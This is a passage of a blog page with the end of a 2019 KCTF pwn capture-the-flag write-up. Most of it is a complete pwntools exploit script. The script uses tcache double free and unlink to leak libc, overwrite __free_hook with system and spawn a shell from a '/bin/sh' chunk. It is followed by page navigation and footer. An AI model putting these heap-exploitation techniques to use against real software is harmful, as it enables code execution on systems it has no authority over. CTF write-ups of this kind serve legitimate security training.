  <span class="comment">#leak libc</span></span><br><span class="line">    s = show(<span class="number">30</span>)[:<span class="number">6</span>]</span><br><span class="line">    puts_addr = u64(s+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#  puts_addr = u64(p.recvline().strip('\n').ljust(8,'\x00'))</span></span><br><span class="line">    print(hex(puts_addr))</span><br><span class="line"><span class="comment">#puts_addr = u64(show(30)[:6]+'\x00'*2)</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="comment">#overwrote __free_hook into system_Addr</span></span><br><span class="line">    <span class="comment">#将free_hook的地址改成system的地址</span></span><br><span class="line">    edit(<span class="number">31</span>,p64(free_hook))</span><br><span class="line">    edit(<span class="number">30</span>,p64(system_addr))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构造一个内容为/bin/sh的堆块，</span></span><br><span class="line">    malloc(<span class="number">29</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:\n'</span>)</span><br><span class="line">    p.sendline(str(<span class="number">29</span>))</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">pwn = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'gift: '</span>)</span><br><span class="line">    gift = int(p.recvline(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    print(gift)</span><br><span class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span> gift</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    s = p.recvuntil(<span class="string">'show\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#prepare for tcache double free</span></span><br><span class="line">    <span class="comment">#fill 0x90 tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">2</span>*i,str(<span class="number">2</span>*i))</span><br><span class="line">        malloc(<span class="number">2</span>*i+<span class="number">1</span>,str(<span class="number">2</span>*i+<span class="number">1</span>))</span><br><span class="line">        free(<span class="number">2</span>*i)</span><br><span class="line">        malloc(<span class="number">2</span>*i,<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)<span class="comment">#overwrite chunk[2*i+1]'s size to 0x90</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">2</span>*i+<span class="number">1</span>)<span class="comment">#fill full 0x90 tcache bin</span></span><br><span class="line">    <span class="comment">#tcache double free</span></span><br><span class="line">    <span class="comment">#make two pointers point to same address</span></span><br><span class="line">    malloc(<span class="number">1</span>,<span class="string">'1111'</span>)</span><br><span class="line">    malloc(<span class="number">3</span>,<span class="string">'3333'</span>)<span class="comment">#old 3</span></span><br><span class="line">    malloc(<span class="number">5</span>,<span class="string">'5555'</span>)</span><br><span class="line">    malloc(<span class="number">7</span>,<span class="string">'7777'</span>)</span><br><span class="line">    malloc(<span class="number">9</span>,<span class="string">'9999'</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)<span class="comment">#overwrite 5's size to 0x91</span></span><br><span class="line">    free(<span class="number">3</span>)<span class="comment">#5 will put into unsorted bin</span></span><br><span class="line">    malloc(<span class="number">3</span>,<span class="string">'3333'</span>)<span class="comment">#new 3's address is same with old 3,unsorted bin chunk's size is 0x60</span></span><br><span class="line">    malloc(<span class="number">11</span>,<span class="string">'11'</span>)<span class="comment">#now 11' address same with 5</span></span><br><span class="line">    heap_ptr = malloc(<span class="number">13</span>,<span class="string">'13'</span>)<span class="comment">#unsorted bin is empty now</span></span><br><span class="line">   </span><br><span class="line">    init_malloc_ptr = heap_ptr<span class="number">-0x370</span></span><br><span class="line">    print(hex(init_malloc_ptr))    </span><br><span class="line">    pinit_malloc_ptr = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">14</span>,<span class="string">'14'</span>)</span><br><span class="line">    <span class="comment">#cause tcache double free</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#now tcache bin[0x30]-&gt;5&gt;13-&gt;11-&gt;14</span></span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">5</span>,p64(init_malloc_ptr))<span class="comment">#11'fd is pinit_malloc_ptr</span></span><br><span class="line">    malloc(<span class="number">13</span>,<span class="string">'13'</span>)</span><br><span class="line">    malloc(<span class="number">11</span>,<span class="string">'11'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#preapare fake chunk for unlink, pinit_malloc_ptr = pinit_malloc_ptr-0x18</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#14 will aclloc to init_malloc_ptr</span></span><br><span class="line">    malloc(<span class="number">14</span>,<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x421</span>)+p64(pinit_malloc_ptr<span class="number">-0x18</span>)+p64(pinit_malloc_ptr<span class="number">-0x10</span>))</span><br><span class="line">    <span class="comment"># prepare for unlink</span></span><br><span class="line">    malloc(<span class="number">15</span>,<span class="string">'15'</span>)</span><br><span class="line">    ptr = malloc(<span class="number">16</span>,<span class="string">'16'</span>)</span><br><span class="line">    print(hex(ptr))</span><br><span class="line">    malloc(<span class="number">17</span>,<span class="string">'17'</span>)</span><br><span class="line">    malloc(<span class="number">18</span>,<span class="string">'18'</span>)</span><br><span class="line">    malloc(<span class="number">19</span>,<span class="string">'19'</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    malloc(<span class="number">15</span>,<span class="string">'b'</span>*<span class="number">0x20</span>+p64(<span class="number">0x420</span>)+<span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#the second tcache double free</span></span><br><span class="line">    <span class="comment">#make 22 and 26 point to same address</span></span><br><span class="line">    malloc(<span class="number">20</span>,<span class="string">'20'</span>)</span><br><span class="line">    malloc(<span class="number">21</span>,<span class="string">'21'</span>)</span><br><span class="line">    malloc(<span class="number">22</span>,<span class="string">'22'</span>)</span><br><span class="line">    malloc(<span class="number">23</span>,<span class="string">'23'</span>)</span><br><span class="line">    malloc(<span class="number">24</span>,<span class="string">'24'</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    malloc(<span class="number">20</span>,<span class="string">'c'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    malloc(<span class="number">25</span>,<span class="string">'25'</span>)</span><br><span class="line">    malloc(<span class="number">26</span>,<span class="string">'26'</span>)</span><br><span class="line">    malloc(<span class="number">27</span>,<span class="string">'27'</span>)</span><br><span class="line">    malloc(<span class="number">28</span>,<span class="string">'28'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#tcache double free</span></span><br><span class="line">    free(<span class="number">28</span>)</span><br><span class="line">    free(<span class="number">26</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    <span class="comment">#now tcache bin[0x30]-&gt;22&gt;27-&gt;26-&gt;28</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now 26's fd point to 0x404170</span></span><br><span class="line">    malloc(<span class="number">22</span>,p64(<span class="number">0x404170</span>))</span><br><span class="line">    malloc(<span class="number">27</span>,<span class="string">'27'</span>)</span><br><span class="line">    malloc(<span class="number">26</span>,<span class="string">'26'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#trigger unlink, change limit of adddre to 0x404048~0x404048+0x800</span></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#array[30]'s heap_addr overwrite into puts_addr,array[31]'</span></span><br><span class="line">    <span class="comment">#heap_addr overwrite into 0x40170(array[30]), </span></span><br><span class="line">    <span class="comment">#and 32 heap chunk's show flag overwrite into 1</span></span><br><span class="line">    malloc(<span class="number">28</span>,p64(pwn.got[<span class="string">'puts'</span>])+p64(<span class="number">0x404170</span>)+<span class="string">'\x77'</span>*<span class="number">0x10</span>)</span><br><span class="line">  <span class="comment">#  gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    s = show(<span class="number">30</span>)[:<span class="number">6</span>]</span><br><span class="line">    puts_addr = u64(s+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#  puts_addr = u64(p.recvline().strip('\n').ljust(8,'\x00'))</span></span><br><span class="line">    print(hex(puts_addr))</span><br><span class="line"><span class="comment">#puts_addr = u64(show(30)[:6]+'\x00'*2)</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="comment">#overwrote __free_hook into system_Addr</span></span><br><span class="line">    <span class="comment">#将free_hook的地址改成system的地址</span></span><br><span class="line">    edit(<span class="number">31</span>,p64(free_hook))</span><br><span class="line">    edit(<span class="number">30</span>,p64(system_addr))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构造一个内容为/bin/sh的堆块，</span></span><br><span class="line">    malloc(<span class="number">29</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:\n'</span>)</span><br><span class="line">    p.sendline(str(<span class="number">29</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://mp.weixin.qq.com/s/txrgqguaLwKTq6DFvvq0dw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/txrgqguaLwKTq6DFvvq0dw</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/06/28/2019-kctf-沉睡的敦煌-writeup/" title="2019 kctf 沉睡的敦煌 writeup">https://v1ckydxp.github.io/archives/2019/06/28/2019-kctf-沉睡的敦煌-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn-unlink/" rel="tag"># pwn-unlink</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/27/2017_wheelofrobots/" rel="next" title="2017 wheelofrobots -unlink writeup">
+                <i class="fa fa-chevron-left"></i> 2017 wheelofrobots -unlink writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/30/Tcache-机制分析及利用思路/" rel="prev" title="Tcache 机制分析及利用思路">
+                Tcache 机制分析及利用思路 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看程序基本信息"><span class="nav-number">1.</span> <span class="nav-text">查看程序基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序基本逻辑"><span class="nav-number">2.</span> <span class="nav-text">程序基本逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc"><span class="nav-number">2.1.</span> <span class="nav-text">malloc()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#edit"><span class="nav-number">2.2.</span> <span class="nav-text">edit()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show"><span class="nav-number">2.3.</span> <span class="nav-text">show()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">3.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
